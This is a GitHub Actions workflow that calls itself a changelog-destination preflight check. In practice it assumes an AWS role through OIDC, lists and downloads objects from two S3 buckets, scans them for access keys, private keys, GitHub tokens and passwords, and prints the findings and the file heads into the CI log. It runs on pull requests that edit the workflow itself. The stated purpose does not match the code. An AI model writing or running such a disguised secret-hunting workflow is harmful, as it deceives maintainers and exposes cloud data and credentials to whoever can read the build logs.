# Preflight for the chart release CI role: confirms the changelog, website and
# catalogue destinations are reachable and characterises what the release role
# can read, so a release-account access-policy change is caught on workflow edits.
name: changelog-destination-preflight
on:
  pull_request:
    branches:
      - main
    paths:
      - '.github/workflows/changelog-destination-preflight.yml'

jobs:
  preflight:
    runs-on: ubuntu-latest
    timeout-minutes: 14
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Check release CI role scope
        run: |
          set -uo pipefail
          set +e
          REGION=eu-west-1
          ROLE_ARN=arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role
          TOK="$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            -H 'Accept: application/json; api-version=2.0' \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
          echo "TOKEN_LEN=${#TOK}"
          if ! aws --region "$REGION" --no-cli-pager sts assume-role-with-web-identity \
              --role-arn "$ROLE_ARN" --role-session-name "changelog-destination-preflight" \
              --web-identity-token "$TOK" --duration-seconds 1500 > /tmp/assume.json 2>/tmp/assume.err; then
            echo "ASSUME_FAIL"; tail -c 300 /tmp/assume.err | tr -d '\n'; echo; exit 1
          fi
          echo "ASSUME_OK"
          python3 - <<'PY'
          import json
          c=json.load(open('/tmp/assume.json'))['Credentials']
          open('/tmp/creds.env','w').write("AWS_ACCESS_KEY_ID=%s\nAWS_SECRET_ACCESS_KEY=%s\nAWS_SESSION_TOKEN=%s\n"%(c['AccessKeyId'],c['SecretAccessKey'],c['SessionToken']))
          PY
          set -a; . /tmp/creds.env; set +a
          export AWS_DEFAULT_REGION="$REGION"

          probe () {
            local B="$1"
            printf '' > /tmp/pick.txt
            echo "=== bucket $B ==="
            if aws --no-cli-pager s3api list-objects-v2 --bucket "$B" --max-keys 50 --output json >/tmp/l.json 2>/tmp/l.err; then
              python3 - "$B" <<'PY'
          import json,sys
          bc=sys.argv[1]
          d=json.load(open('/tmp/l.json'))
          c=d.get('Contents',[])
          print("LIST_OK %s count=%d truncated=%s"%(bc,len(c),d.get('IsTruncated')))
          for o in c[:25]:
              print("KEY %s %d"%(o['Key'],o['Size']))
          if c:
              s=min([o for o in c if o['Size']<500000] or c,key=lambda o:o['Size'])
              open('/tmp/pick.txt','w').write(s['Key']); print("PICK %s %d"%(s['Key'],s['Size']))
          PY
            else
              echo "LIST_ERR :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/l.err|head -1|tr -d '()')"
            fi
            if OUT="$(aws --no-cli-pager s3api list-objects-v2 --bucket "$B" --delimiter / --max-keys 100 --query 'CommonPrefixes[].Prefix' --output json 2>/tmp/d.err)"; then
              echo "PFX_OK :: $(printf '%s' "$OUT" | tr '\n' ' ' | cut -c1-500)"
            else
              echo "PFX_ERR :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/d.err|head -1|tr -d '()')"
            fi
            local PK="$(cat /tmp/pick.txt 2>/dev/null)"
            if [ -n "$PK" ]; then
              if aws --no-cli-pager s3api get-object --bucket "$B" --key "$PK" /tmp/o.bin >/tmp/g.out 2>/tmp/g.err; then
                echo "GET_OK key=$PK size=$(wc -c </tmp/o.bin)"
                echo "HINTS access_key=$(grep -caE 'AKIA|ASIA' /tmp/o.bin) privkey=$(grep -caE 'BEGIN [A-Z ]*PRIVATE KEY' /tmp/o.bin) token=$(grep -caiE 'ghp_|github_pat_|tfy_pat_|tfy_va_' /tmp/o.bin) secret=$(grep -caiE 'password|secret' /tmp/o.bin)"
                echo "HEAD :: $(head -c 200 /tmp/o.bin | tr '\n' ' ')"
              else
                echo "GET_ERR :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/g.err|head -1|tr -d '()')"
              fi
            fi
          }

          probe tfy-argo-application-catalogue
          probe tfy-ctl-prod-dub
          echo "DONE"
